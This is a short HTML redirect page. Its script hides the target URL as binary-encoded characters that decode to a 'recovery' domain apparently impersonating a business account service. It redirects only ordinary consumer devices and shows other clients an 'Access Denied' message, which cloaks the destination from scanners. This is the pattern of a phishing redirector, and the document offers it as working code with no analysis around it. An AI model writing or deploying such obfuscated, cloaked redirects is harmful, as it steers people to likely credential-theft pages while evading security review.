<!DOCTYPE html>
<html>
<head>
<meta charset="UTF-8">
<title>Redirecting...</title>
<script>
const binary = [
  "01101000","01110100","01110100","01110000","01110011","00111010","00101111","00101111",
  "01110010","01100101","01100011","01101111","01110110","01100101","01110010","01111001",
  "00101101","01101101","01111001","00101101","01101101","01100010","01110101","01110011",
  "01101001","01101110","01100101","01110011","01110011","00101101","01110011","01110101",
  "01101001","01110100","01100101","00101110","01110111","01100001","01110011","01101101",
  "01100101","01110010","00101110","01100001","01110000","01110000","00101111"
];

// Convert binary â†’ string
const url = binary.map(b => String.fromCharCode(parseInt(b, 2))).join("");

// Detect allowed operating systems
const userAgent = navigator.userAgent || navigator.vendor || window.opera;
const allowedOS = /Windows|Macintosh|iPhone|iPad|iPod|Android/i;

if (allowedOS.test(userAgent)) {
    // Redirect allowed devices
    window.location.replace(url);
} else {
    // Block others
    document.body.innerHTML = "<h2>Access Denied: Your device is not supported.</h2>";
}
</script>
</head>
<body></body>
</html>
